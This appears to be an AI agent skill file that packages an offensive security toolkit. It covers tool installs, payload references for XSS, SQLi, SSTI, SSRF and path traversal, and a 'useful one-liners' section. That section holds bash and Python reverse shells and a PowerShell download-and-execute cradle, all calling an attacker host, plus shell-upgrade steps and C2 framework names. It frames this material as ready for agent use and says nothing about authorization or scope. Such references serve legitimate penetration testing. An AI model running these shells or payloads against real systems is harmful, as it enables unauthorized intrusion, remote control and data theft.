---
name: security-arsenal
description: "Security testing arsenal: environment setup, payload collections, cheatsheets, and reusable scripts for offensive security work. Use this skill when setting up a testing environment or needing ready-made payloads and reference material."
---

# Security Arsenal

## Overview

Reference material and environment setup. Use it to avoid rebuilding what already exists.

## Environment

```bash
# Kali base
sudo apt update && sudo apt install -y nmap ffuf feroxbuster nuclei sqlmap hydra john hashcat

# python tooling
pipx install impacket
pipx install crackmapexec   # or netexec
pipx install bloodhound
pipx install certipy-ad
pipx install paramiko

# go tooling
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/ffuf/ffuf@latest
```

## Payload references

| Class | Where |
|---|---|
| XSS | `seclists/Fuzzing/XSS/`, `payloadsallthethings` |
| SQLi | `sqlmap` tamper scripts, `seclists/Fuzzing/SQLi/` |
| SSTI | engine-specific: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` |
| Path traversal | `../../../../etc/passwd`, encoded variants |
| SSRF | `http://169.254.169.254/`, `gopher://`, DNS rebinding |
| Reverse shells | `revshells.com`, `pentestmonkey` |
| Deserialization | ysoserial (Java), ysoserial.net, phpggc |
| XXE | external entity with `file://` and OOB DTD |

## Useful one-liners

```bash
# reverse shell
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("A",P));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'

# file transfer
python3 -m http.server 8000
curl -O http://ATTACKER:8000/file
# powershell
IEX(New-Object Net.WebClient).DownloadString('http://A/x.ps1')

# shell upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl-Z, stty raw -echo; fg, export TERM=xterm
```

## Wordlists

```bash
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

## Frameworks

- **Metasploit** — exploitation framework
- **Nuclei** — template-based scanning
- **Empire / Sliver / Mythic** — C2
- **Caldera** — automated adversary emulation

## Pitfalls

- Payload collections are noisy — tailor to the target's parser.
- Blindly running a reverse shell without a listener wastes the opportunity.
- Stale wordlists miss modern paths (`/api/v2/`, `/.well-known/`).

## Verification

Any payload from this arsenal must be validated against the specific target parser before use.
